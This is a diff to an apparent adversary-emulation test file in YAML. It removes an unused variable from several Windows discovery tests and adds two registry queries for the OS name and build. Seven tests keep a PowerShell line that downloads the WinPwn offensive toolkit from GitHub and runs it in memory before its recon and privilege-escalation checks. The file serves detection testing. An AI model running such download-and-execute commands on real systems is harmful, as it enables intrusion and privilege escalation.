@@ -187,7 +187,6 @@ atomic_tests:
   - windows
   executor:
     command: |-
-      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
       winPEAS -noninteractive -consoleoutput
     name: powershell
@@ -198,7 +197,6 @@ atomic_tests:
   - windows
   executor:
     command: |-
-      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
       itm4nprivesc -noninteractive -consoleoutput
     name: powershell
@@ -209,7 +207,6 @@ atomic_tests:
   - windows
   executor:
     command: |-
-      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
       oldchecks -noninteractive -consoleoutput
     cleanup_command: |-
@@ -226,7 +223,6 @@ atomic_tests:
   - windows
   executor:
     command: |-
-      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
       otherchecks -noninteractive -consoleoutput
     name: powershell
@@ -237,7 +233,6 @@ atomic_tests:
   - windows
   executor:
     command: |-
-      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
       Generalrecon -consoleoutput -noninteractive
     name: powershell
@@ -248,7 +243,6 @@ atomic_tests:
   - windows
   executor:
     command: |-
-      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
       Morerecon -noninteractive -consoleoutput
     name: powershell
@@ -259,7 +253,6 @@ atomic_tests:
   - windows
   executor:
     command: |-
-      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
       RBCD-Check -consoleoutput -noninteractive
     name: powershell
@@ -579,3 +572,27 @@ atomic_tests:
     name: command_prompt
     command: |
       powershell.exe -c "gdr -PSProvider 'FileSystem'"
+- name: Discover OS Product Name via Registry
+  auto_generated_guid: be3b5fe3-a575-4fb8-83f6-ad4a68dd5ce7
+  description: |
+    Identify the Operating System Product Name via registry with the reg.exe command.
+    Upon execution, the OS Product Name will be displayed.
+  supported_platforms:
+    - windows
+  executor:
+    command: |
+      reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName
+    name: command_prompt
+    elevation_required: false
+- name: Discover OS Build Number via Registry
+  auto_generated_guid: acfcd709-0013-4f1e-b9ee-bc1e7bafaaec
+  description: |
+    Identify the Operating System Build Number via registry with the reg.exe command.
+    Upon execution, the OS Build Number will be displayed.
+  supported_platforms:
+    - windows
+  executor:
+    command: |
+      reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentBuildNumber
+    name: command_prompt
+    elevation_required: false
